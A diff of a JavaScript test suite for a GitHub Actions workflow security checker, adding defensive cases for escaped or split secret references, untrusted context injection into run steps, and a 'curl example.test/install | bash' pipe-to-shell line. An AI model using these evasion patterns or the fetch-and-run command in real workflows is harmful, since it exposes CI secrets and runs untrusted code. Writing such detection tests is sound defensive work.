@@ -85,27 +85,123 @@ jobs:
 `;
     const indented = workflowProblems('.github/workflows/ci.yml', twoSpaces).join('\n');
     assert.match(indented, /job test may not hold contents: write/);
-    assert.match(indented, /job remote hands a secret to example\/workflows/);
+    assert.match(indented, /a secret is read outside jev\.yml/);
     const all = workflowProblems('.github/workflows/ci.yml', workflow.replace('        runs-on: ubuntu-latest\n', '        runs-on: ubuntu-latest\n        permissions: write-all\n')).join('\n');
     assert.match(all, /write-all/);
 });
 
-test('accepts a secret handed on to a reusable workflow, the allowed cache write, and a secret read by the Jev workflow', () => {
+test('accepts the allowed cache write and a secret read by the independent Jev workflow', () => {
     const caller = workflow.replace('        runs-on: ubuntu-latest\n', `        runs-on: ubuntu-latest
         permissions:
             contents: read
             packages: write
-`).replace('    test:', '    cache:') + `    jev:
-        uses: ./.github/workflows/jev.yml
-        secrets:
-            KEY: \${{ secrets.KEY }}
-`;
+`).replace('    test:', '    cache:');
     assert.deepEqual(workflowProblems('.github/workflows/ci.yml', caller), []);
     const reader = workflow + `            - env:
                   KEY: \${{ secrets.KEY }}
               run: echo ok
 `;
     assert.deepEqual(workflowProblems('.github/workflows/jev.yml', reader), []);
+});
+
+test('secret references use the same boundary for brackets, whitespace, functions and whole contexts', () => {
+    for (const expression of [
+        "secrets['KEY']", "secrets [ 'KEY' ]", 'SeCrEtS . KEY',
+        "format('{0}', secrets.KEY)", 'toJSON(secrets)', "format('}}', secrets['KEY'])",
+    ]) {
+        const unsafe = workflow + `            - env:\n                  KEY: \${{ ${expression} }}\n              run: echo ok\n`;
+        assert.match(workflowProblems('.github/workflows/ci.yml', unsafe).join('\n'), /a secret is read outside jev\.yml/, expression);
+        assert.deepEqual(workflowProblems('.github/workflows/jev.yml', unsafe), [], expression);
+    }
+    const passThrough = workflow + `    jev:\n        uses: ./.github/workflows/jev.yml\n        secrets:\n            KEY: \${{ secrets['KEY'] }}\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', passThrough).join('\n'), /a secret is read outside jev\.yml/);
+    const multiline = workflow + `            - env:\n                  KEY: >-\n                      \${{ format('{0}',\n                          secrets [ 'KEY' ]) }}\n              run: echo ok\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', multiline).join('\n'), /a secret is read outside jev\.yml/);
+});
+
+test('indexed and nested untrusted contexts stay out of run scripts and may pass through env', () => {
+    for (const expression of [
+        "github['event']['pull_request']['title']", "github . event . pull_request . title",
+        "github [ 'head_ref' ]", "inputs['text']", 'toJSON(inputs)', 'toJSON(github.event)',
+        "format('{0}', GitHub [ 'EVENT' ].pull_request.title)", "github[format('event')].pull_request.title",
+    ]) {
+        const unsafe = workflow + `            - run: echo \${{ ${expression} }}\n`;
+        assert.match(workflowProblems('.github/workflows/ci.yml', unsafe).join('\n'), /untrusted expression expanded inside a run/, expression);
+        const viaEnv = workflow + `            - env:\n                  TEXT: \${{ ${expression} }}\n              run: echo "$TEXT"\n`;
+        assert.deepEqual(workflowProblems('.github/workflows/ci.yml', viaEnv), [], expression);
+    }
+    const multiline = workflow + `            - run: |\n                  echo \${{ github\n                      [ 'event' ].pull_request.title }}\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', multiline).join('\n'), /untrusted expression expanded inside a run/);
+});
+
+test('expression string literals are data and trusted indexed metadata stays usable', () => {
+    for (const expression of [
+        "format('secrets.KEY }} github.event.title inputs.text')", "format('don''t: secrets.KEY')",
+        "github['sha']", 'github . event_name', "env['secrets']",
+    ]) {
+        const safe = workflow + `            - run: echo \${{ ${expression} }}\n`;
+        assert.deepEqual(workflowProblems('.github/workflows/ci.yml', safe), [], expression);
+    }
+});
+
+test('whitespace before YAML colons cannot bypass action, credential, permission or shell checks', () => {
+    const spaced = workflow.replace(/([A-Za-z0-9_-]+):/g, '$1 :');
+    assert.deepEqual(workflowProblems('.github/workflows/ci.yml', spaced), []);
+    const write = spaced.replace('        runs-on : ubuntu-latest\n', '        runs-on : ubuntu-latest\n        "permissions" :\n            contents : write\n');
+    assert.match(workflowProblems('.github/workflows/ci.yml', write).join('\n'), /job test may not hold contents: write/);
+    assert.match(workflowProblems('.github/workflows/ci.yml', spaced.replace(`actions/checkout@${sha}`, 'actions/checkout@v7')).join('\n'), /not pinned/);
+    assert.match(workflowProblems('.github/workflows/ci.yml', spaced.replace('                  persist-credentials : false\n', '')).join('\n'), /persist-credentials/);
+    const shell = spaced + `            - 'run' : echo \${{ github['head_ref'] }}\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', shell).join('\n'), /untrusted expression expanded inside a run/);
+    const secret = spaced + `            - env :\n                  KEY : \${{ secrets['KEY'] }}\n              run : echo ok\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', secret).join('\n'), /a secret is read outside jev\.yml/);
+});
+
+test('quoted checkout references still require credential-free checkouts', () => {
+    for (const quote of ["'", '"']) {
+        const quoted = workflow.replace(`actions/checkout@${sha}`, `${quote}actions/checkout@${sha}${quote}`);
+        assert.deepEqual(workflowProblems('.github/workflows/ci.yml', quoted), []);
+        const unsafe = quoted.replace('                  persist-credentials: false\n', '');
+        assert.match(workflowProblems('.github/workflows/ci.yml', unsafe).join('\n'), /persist-credentials: false/);
+    }
+});
+
+test('escaped quoted YAML cannot hide contexts, mapping keys or expression delimiters', () => {
+    for (const escaped of [
+        `            - env:\n                  KEY: "\${{ \\u0073ecrets.KEY }}"\n              run: echo ok\n`,
+        `            - env:\n                  KEY: "\\u0024{{ secrets.KEY }}"\n              run: echo ok\n`,
+        `            - run: "\${{ github['\\u0065vent'].pull_request.title }}"\n`,
+    ]) {
+        assert.match(workflowProblems('.github/workflows/ci.yml', workflow + escaped).join('\n'), /escaped double-quoted YAML/);
+    }
+    const key = workflow.replace('        runs-on: ubuntu-latest\n', '        runs-on: ubuntu-latest\n        "perm\\u0069ssions":\n            contents: write\n');
+    assert.match(workflowProblems('.github/workflows/ci.yml', key).join('\n'), /escaped double-quoted YAML/);
+});
+
+test('hexadecimal YAML escapes cannot hide credentials in multiline, flow, tagged or anchored scalars', () => {
+    for (const scalar of [
+        `            - env:\n                  KEY: "prefix\n                      \${{ \\u0073ecrets.KEY }}"\n              run: echo ok\n`,
+        `            - env: { KEY: "\${{ \\u0073ecrets.KEY }}" }\n              run: echo ok\n`,
+        `            - env:\n                  KEY: !!str "\${{ \\u0073ecrets.KEY }}"\n              run: echo ok\n`,
+        `            - env:\n                  KEY: &key "\${{ \\u0073ecrets.KEY }}"\n              run: echo ok\n`,
+        `            - env: { KEY: "\\x24\\u007b\\U0000007b \\x73ecrets.KEY }}" }\n              run: echo ok\n`,
+    ]) {
+        assert.match(workflowProblems('.github/workflows/ci.yml', workflow + scalar).join('\n'), /a secret is read outside jev\.yml/);
+    }
+    const shell = workflow + `            - run: !!str "\${{ github['\\u0065vent'].pull_request.title }}"\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', shell).join('\n'), /untrusted expression expanded inside a run/);
+    const literal = workflow + `            - run: echo \${{ format('\\u0073ecrets.KEY') }}\n`;
+    assert.deepEqual(workflowProblems('.github/workflows/ci.yml', literal), []);
+});
+
+test('YAML escaped line continuations cannot split credential or untrusted context identities', () => {
+    const continuation = String.fromCharCode(92, 10);
+    const secret = workflow + `            - env:\n                  KEY: "\${{ sec${continuation}                      rets.KEY }}"\n              run: echo ok\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', secret).join('\n'), /a secret is read outside jev\.yml/);
+    const shell = workflow + `            - run: "\${{ git${continuation}                  hub.event.pull_request.title }}"\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', shell).join('\n'), /untrusted expression expanded inside a run/);
+    const pipe = workflow + `            - run: |\n                  curl${continuation}                      https://example.test/install | bash\n`;
+    assert.match(workflowProblems('.github/workflows/ci.yml', pipe).join('\n'), /piped directly into a shell/);
 });
 
 test('quoted permission values and mapping keys cannot bypass the job write allowlist', () => {
